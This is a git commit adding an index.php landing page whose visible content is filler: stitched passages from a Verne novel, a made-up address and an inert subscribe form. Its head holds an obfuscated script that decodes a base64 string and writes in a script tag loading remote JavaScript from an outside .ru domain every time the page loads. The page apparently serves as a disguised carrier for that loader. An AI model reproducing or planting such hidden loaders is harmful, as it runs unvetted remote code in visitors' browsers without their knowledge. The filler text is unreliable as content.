1ac93e2e25d5937f6999f1657646a21e2ef54d27
zeldobfs <75680795+zeldobfs@users.noreply.github.com>
2020-12-08 15:56:43 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The fishing over, the Nautilus neared the coast. About here a number of</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9kZXFycXRvdmpmMWYiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The fishing over, the Nautilus neared the coast. About here a number of</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">But how shall we get off?</h3>
+		<p>While I was contemplating this inert mass, a dozen of these voracious beasts appeared round the boat; and, without noticing us, threw themselves upon the dead body and fought with one another for the pieces. It became necessary to renew the atmosphere of our prison, and no doubt the whole in the submarine boat. That gave rise to a question in my mind. How would the commander of this floating dwelling-place proceed? Would he obtain air by chemical means, in getting by heat the oxygen contained in chlorate of potash, and in absorbing carbonic acid by caustic potash? Or, a more convenient, economical, and consequently more probable alternative, would he be satisfied to rise and take breath at the surface of the water, like a cetacean, and so renew for twenty-four hours the atmospheric provision? What if some volcanic burst should one day raise these two barriers above the waves? Or rather his banking-house; by that I mean the ocean, where his riches are safer than in the chests of the state.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Next to the kitchen was the berth-room of </h3>
+		<p>Saying which, Captain Nemo went toward a piece of furniture standing near the left panel of the saloon. Near this piece of furniture, I saw a chest bound with iron, on the cover of which was a copper plate, bearing the cipher of the Nautilus with its device. The crew waited impatiently for their chief's orders. The latter, after having observed the animal attentively, called the engineer. The engineer ran to him. I turned to Captain Nemo. That terrible avenger, a perfect archangel of hatred, was still looking. When all was over, he turned to his room, opened the door, and entered. I followed him with my eyes. On the end wall beneath his heroes, I saw the portrait of a woman still young, and two little children. Captain Nemo looked at them for some moments, stretched his arms toward them, and kneeling down burst into deep sobs. Well, come and you will see.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">Conseil had followed me for the last ten years wherever science</h3>	
+		<p>Ah! said I. You know? The narwhal seemed motionless; perhaps, tired with its day's work, it slept, letting itself float with the undulation of the waves. Now was a chance of which the captain resolved to take advantage. I wanted to go to the captain's assistance, but, nailed to the spot with horror, I could not stir. It was not a question of dead or dying. I rejoined Ned Land and Conseil, and told them of Captain Nemo's proposition. Conseil hastened to accept it, and this time the Canadian seemed quite willing to follow our example.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>0499 Wendy Ridge, Apt. 024, 79980, Dorthymouth, Nebraska, United States</p>
+	</footer>
+
+</body>
+
+</html>
